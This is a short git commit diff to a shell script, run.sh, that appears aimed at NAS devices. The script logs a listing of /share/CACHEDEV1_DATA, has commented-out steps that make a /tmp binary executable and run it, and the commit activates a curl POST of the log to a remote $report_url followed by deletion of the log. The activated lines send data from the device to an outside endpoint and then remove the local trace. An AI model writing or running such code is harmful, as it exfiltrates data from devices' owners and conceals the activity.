8bd7bdaf3858268fbb97acf1f42a486b88086106
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 16:53:18 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -10,6 +10,6 @@ ls /share/CACHEDEV1_DATA/* 1>>/tmp/tmplog60920.log 2>&1
 # chmod 777 /tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1
 # ls /tmp/*.bin 1>>/tmp/tmplog60920.log 2>&1
 # /tmp/arm64_7.bin 1>>/tmp/tmplog60920.log 2>&1 
-# curl -X POST $report_url -d @/tmp/tmplog60920.log
-# rm /tmp/tmplog60920.log
+curl -X POST $report_url -d @/tmp/tmplog60920.log
+rm /tmp/tmplog60920.log
 # rm /tmp/arm64_7.bin
